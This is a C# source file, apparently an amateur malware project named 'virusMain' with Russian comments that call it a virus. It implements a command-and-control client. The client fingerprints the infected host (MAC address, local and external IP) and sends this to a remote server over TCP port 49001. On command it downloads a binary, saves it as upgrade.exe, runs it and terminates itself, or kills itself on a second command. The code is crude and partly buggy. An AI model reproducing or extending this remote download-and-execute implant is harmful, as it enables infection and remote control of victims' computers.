using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;

/*
 Комманды:
0. Комманд нету
1. убить процесс себя
 */
/*
 Ошибки:
1.1 Запустить программу с обновлением
1.2 Не получилось из сообщения достать размер файла
1.3 Не получилось убить процесс себя
 */
/*
 Комманды от сервака:
U. Обнова и далее размер файла
C. Комманда, далее код комманды
 */

/*
 Комманды от себя:
V. версия вируса
I. локальный IP
O. внешний IP
M. Мак адрес
 */

namespace virusMain
{
    class Update
    {
        private int version = 1;
        int serverTcpPort = 49001;

        public string GiveMAC()                                             //Получение мак адреса пк
        {
            var macAddress = NetworkInterface.GetAllNetworkInterfaces();
            var getTarget = macAddress[0].GetPhysicalAddress();
            return getTarget.ToString();
        }

        public void setversion(int new_version_id)                          //на всякий случай
        {
            version = new_version_id;
        }

        public int giveversion() { return version; }                        //Возвращает версию

        public static string GiveGlobalIp()
        {
            WebClient client = new WebClient();
            string ip = client.DownloadString("http://www.whatismyip.org");
            return ip;
        }

        public void CheckForCommands(int timing, string ip_str)
        {
            var myIp_locale = "127.0.0.1"/*give_locale_ip()*/;
            var tcpEndPoint = new IPEndPoint(IPAddress.Parse(ip_str), serverTcpPort);

            var tcpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            string message = "V" + version.ToString() + "I" + myIp_locale.ToString() + "O" + GiveGlobalIp() + 'M' + GiveMAC();

            var data = Encoding.UTF8.GetBytes(message);
            tcpSocket.Connect(tcpEndPoint);
            tcpSocket.Send(data);
            var buffer = new byte[256];
            var size = 0;
            var data_answ = new StringBuilder();

            do
            {
                size = tcpSocket.Receive(buffer);
                data_answ.Append(Encoding.UTF8.GetString(buffer, 0, size));
            } while (tcpSocket.Available > 0);

            if (data_answ.ToString() != "0")
            {
                for (int i = 0; i < data_answ.Length; i++)
                {
                    switch (data_answ.ToString()[i])
                    {
                        case 'U':                                                   //обнова
                            try
                            {
                                string answ_data = "";
                                for (int j = i + 1; j < data_answ.Length; j++)
                                {
                                    answ_data += data_answ[j].ToString();
                                }
                                var answ = Convert.ToInt64(answ_data);

                                var newbuffer = new byte[answ + 5];

                                do
                                {
                                    size = tcpSocket.Receive(newbuffer);
                                } while (tcpSocket.Available > 0);
                                string outpath = "upgrade.exe";
                                File.WriteAllBytes(outpath, newbuffer);

                                try
                                {
                                    Process.Start("upgrade.exe");

                                    Process.GetCurrentProcess().Kill();
                                }
                                catch (Exception)
                                {
                                    tcpSocket.Send(Encoding.UTF8.GetBytes("ERROR WITH UPGRADE: code 1.1"));
                                    //throw;
                                }
                            }
                            catch (Exception)
                            {
                                tcpSocket.Send(Encoding.UTF8.GetBytes("ERROR WITH UPGRADE: code 1.2"));
                                //throw;
                            }
                            break;

                        case 'C':                                                                               //Комманды
                            switch (data_answ[i + 1])                                               
                            {
                                case '1':                                                                       //Убить себя
                                    try
                                    {
                                        Process.GetCurrentProcess().Kill();
                                    }
                                    catch (Exception)
                                    {
                                        tcpSocket.Send(Encoding.UTF8.GetBytes("ERROR WITH CLOSE: code 1.3"));
                                    }
                                    
                                    break;
                                default:
                                    break;
                            }
                            break;
                        default:
                            break;
                    }
                }
            }

            

            if (data_answ.ToString() != "ERROR")
            {
               
            }
            tcpSocket.Shutdown(SocketShutdown.Both);
            tcpSocket.Close();

            Thread.Sleep(timing * 1000);

            /* 
                */
        }
        public IPAddress give_locale_ip()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var locale_ip in host.AddressList)
            {
                if (locale_ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return locale_ip;
                }
                return null;
            }
            return null;
        }
    }
}
